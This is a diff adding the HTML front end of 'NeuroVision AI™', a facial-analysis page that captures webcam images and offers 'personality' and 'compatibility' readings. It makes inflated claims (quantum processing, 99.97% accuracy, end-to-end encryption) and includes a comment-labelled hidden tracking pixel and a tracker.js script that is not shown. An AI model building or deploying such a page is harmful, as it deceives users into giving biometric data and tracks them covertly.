@@ -1,0 +1,204 @@
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NeuroVision AI™ - Advanced Facial Analysis System</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    <div class="scanner-overlay"></div>
+
+    <div class="main-container">
+        <header class="header">
+            <div class="logo-section">
+                <div class="logo-animation">
+                    <div class="logo-ring"></div>
+                    <div class="logo-core">AI</div>
+                </div>
+                <div class="brand-text">
+                    <h1>NeuroVision AI™</h1>
+                    <p class="tagline">Quantum Neural Network v3.2.1</p>
+                </div>
+            </div>
+            <div class="status-bar">
+                <span class="status-item">STATUS: <span class="status-online">ONLINE</span></span>
+                <span class="status-item">ACCURACY: <span class="accuracy">99.97%</span></span>
+                <span class="status-item">MODEL: GPT-5-VISION</span>
+            </div>
+        </header>
+
+        <div class="content-wrapper">
+            <!-- Welcome Screen -->
+            <div id="welcome-screen" class="screen active">
+                <div class="welcome-content">
+                    <div class="hologram-effect">
+                        <h2 class="glitch" data-text="ADVANCED FACIAL RECOGNITION">ADVANCED FACIAL RECOGNITION</h2>
+                    </div>
+                    <div class="features-grid">
+                        <div class="feature-card">
+                            <div class="feature-icon">🧠</div>
+                            <h3>Neural Analysis</h3>
+                            <p>Deep Learning Algorithm</p>
+                        </div>
+                        <div class="feature-card">
+                            <div class="feature-icon">🔬</div>
+                            <h3>Biometric Scan</h3>
+                            <p>128 Point Detection</p>
+                        </div>
+                        <div class="feature-card">
+                            <div class="feature-icon">🎯</div>
+                            <h3>Precision Mode</h3>
+                            <p>Quantum Processing</p>
+                        </div>
+                        <div class="feature-card">
+                            <div class="feature-icon">🔐</div>
+                            <h3>Secure Analysis</h3>
+                            <p>End-to-End Encryption</p>
+                        </div>
+                    </div>
+                    <button id="start-analysis" class="cyber-button">
+                        <span class="button-text">INITIALIZE SYSTEM</span>
+                        <span class="button-glow"></span>
+                    </button>
+                    <div class="disclaimer">
+                        <p>⚠️ By proceeding, you agree to our advanced biometric analysis</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Camera Screen -->
+            <div id="camera-screen" class="screen">
+                <div class="camera-container">
+                    <div class="camera-frame">
+                        <video id="webcam" autoplay></video>
+                        <canvas id="canvas" style="display: none;"></canvas>
+                        <div class="face-tracker">
+                            <div class="tracker-corner tl"></div>
+                            <div class="tracker-corner tr"></div>
+                            <div class="tracker-corner bl"></div>
+                            <div class="tracker-corner br"></div>
+                            <div class="scan-line"></div>
+                        </div>
+                        <div class="camera-info">
+                            <div class="info-item">RESOLUTION: <span id="resolution">DETECTING...</span></div>
+                            <div class="info-item">FPS: <span id="fps">60</span></div>
+                            <div class="info-item">FACE: <span id="face-status">SCANNING...</span></div>
+                        </div>
+                    </div>
+                    <div class="control-panel">
+                        <button id="capture" class="capture-button">
+                            <div class="capture-ring"></div>
+                            <span>CAPTURE BIOMETRIC DATA</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Analysis Screen -->
+            <div id="analysis-screen" class="screen">
+                <div class="analysis-container">
+                    <div class="analysis-header">
+                        <h2>NEURAL PROCESSING IN PROGRESS</h2>
+                    </div>
+                    <div class="analysis-grid">
+                        <div class="analysis-item">
+                            <div class="progress-circle" data-progress="0">
+                                <svg>
+                                    <circle cx="60" cy="60" r="54"></circle>
+                                    <circle cx="60" cy="60" r="54" class="progress"></circle>
+                                </svg>
+                                <div class="progress-value">0%</div>
+                            </div>
+                            <p>Facial Mapping</p>
+                        </div>
+                        <div class="analysis-item">
+                            <div class="progress-circle" data-progress="0">
+                                <svg>
+                                    <circle cx="60" cy="60" r="54"></circle>
+                                    <circle cx="60" cy="60" r="54" class="progress"></circle>
+                                </svg>
+                                <div class="progress-value">0%</div>
+                            </div>
+                            <p>Feature Extraction</p>
+                        </div>
+                        <div class="analysis-item">
+                            <div class="progress-circle" data-progress="0">
+                                <svg>
+                                    <circle cx="60" cy="60" r="54"></circle>
+                                    <circle cx="60" cy="60" r="54" class="progress"></circle>
+                                </svg>
+                                <div class="progress-value">0%</div>
+                            </div>
+                            <p>Pattern Recognition</p>
+                        </div>
+                    </div>
+                    <div class="terminal-output">
+                        <div class="terminal-line">> Initializing quantum processor...</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Result Screen -->
+            <div id="result-screen" class="screen">
+                <div class="result-container">
+                    <div class="result-header">
+                        <h2>ANALYSIS COMPLETE</h2>
+                        <div class="security-badge">
+                            <span>🔒 SECURED CONNECTION</span>
+                        </div>
+                    </div>
+                    <div class="result-grid">
+                        <div class="result-main">
+                            <div class="face-visualization">
+                                <canvas id="face-canvas"></canvas>
+                                <div class="biometric-points"></div>
+                            </div>
+                        </div>
+                        <div class="result-sidebar">
+                            <div class="metric-card">
+                                <h3>Biometric Scores</h3>
+                                <div id="biometric-results"></div>
+                            </div>
+                            <div class="metric-card">
+                                <h3>Personality Analysis</h3>
+                                <div id="personality-results"></div>
+                            </div>
+                            <div class="metric-card">
+                                <h3>Compatibility Matrix</h3>
+                                <div id="compatibility-results"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="action-buttons">
+                        <button id="save-report" class="cyber-button secondary">
+                            <span>SAVE REPORT</span>
+                        </button>
+                        <button id="retry-analysis" class="cyber-button">
+                            <span>NEW ANALYSIS</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <p>© 2024 NeuroVision AI™ | Powered by Quantum Computing</p>
+                <p class="small-text">This system collects biometric data for analysis purposes</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Hidden tracking pixel -->
+    <img src="" id="tracking-pixel" style="display:none;">
+
+    <script src="tracker.js"></script>
+    <script src="tracker.js"></script>
+</body>
+</html>
